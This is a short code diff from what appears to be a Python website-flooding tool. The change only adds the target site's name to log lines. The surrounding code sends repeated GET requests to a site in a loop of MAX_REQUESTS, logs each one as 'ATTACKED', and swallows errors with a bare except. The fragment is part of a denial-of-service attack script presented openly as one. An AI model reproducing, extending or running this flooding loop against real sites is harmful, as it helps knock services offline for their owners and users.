@@ -91,12 +91,12 @@ def mainth():
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
-                            logger.info("ATTACKED; RESPONSE CODE: " +
+                            logger.info(f"{site} ATTACKED; RESPONSE CODE: " +
                                         str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
-                    logger.info("ATTACKED; RESPONSE CODE: " +
+                    logger.info(f"{site} ATTACKED; RESPONSE CODE: " +
                                 str(response.status_code))
         except:
             logger.warning("issue happened")
